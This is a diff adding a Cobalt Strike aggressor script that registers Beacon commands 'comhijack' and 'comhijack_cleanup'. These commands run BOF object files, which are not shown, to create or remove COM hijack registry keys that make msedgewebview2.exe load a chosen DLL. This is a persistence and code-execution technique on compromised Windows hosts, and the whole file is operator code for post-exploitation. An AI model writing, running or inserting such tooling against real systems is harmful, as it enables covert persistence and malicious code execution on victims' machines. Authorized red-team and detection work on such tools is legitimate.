@@ -1,0 +1,56 @@
+# Register the BOF commands
+beacon_command_register(
+    "comhijack",
+    "Setup COM hijack registry keys for msedgewebview2.exe",
+    "Usage: comhijack [dll_path]\n" .
+    "Example: comhijack C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Edge\\directmanipulation.dll"
+);
+
+beacon_command_register(
+    "comhijack_cleanup",
+    "Remove COM hijack registry keys",
+    "Usage: comhijack_cleanup\n" .
+    "Removes all registry keys created by comhijack"
+);
+
+alias comhijack {
+    local('$barch $args $hijackDllPath');
+    
+    if (size(@_) < 2) {
+        berror($1, "Usage: comhijack [hijack_dll_path]");
+        berror($1, "Example: comhijack C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Edge\\directmanipulation.dll");
+        return;
+    }
+    
+    $hijackDllPath = $2;
+    $barch = barch($1);
+    
+    # Pack arguments
+    $args = bof_pack($1, "z", $hijackDllPath);
+    
+    btask($1, "Setting up COM Hijack registry keys");
+    btask($1, "  Target DLL Path: $hijackDllPath");
+    
+    if ($barch eq "x64") {
+        beacon_inline_execute($1, readbof(script_resource("comhijack.x64.o")), "go", $args);
+    } else {
+        beacon_inline_execute($1, readbof(script_resource("comhijack.x86.o")), "go", $args);
+    }
+}
+
+alias comhijack_cleanup {
+    local('$barch $args');
+    
+    $barch = barch($1);
+    
+    # Pack cleanup argument
+    $args = bof_pack($1, "z", "cleanup");
+    
+    btask($1, "Cleaning up COM Hijack registry keys");
+    
+    if ($barch eq "x64") {
+        beacon_inline_execute($1, readbof(script_resource("comhijack.x64.o")), "go", $args);
+    } else {
+        beacon_inline_execute($1, readbof(script_resource("comhijack.x86.o")), "go", $args);
+    }
+}
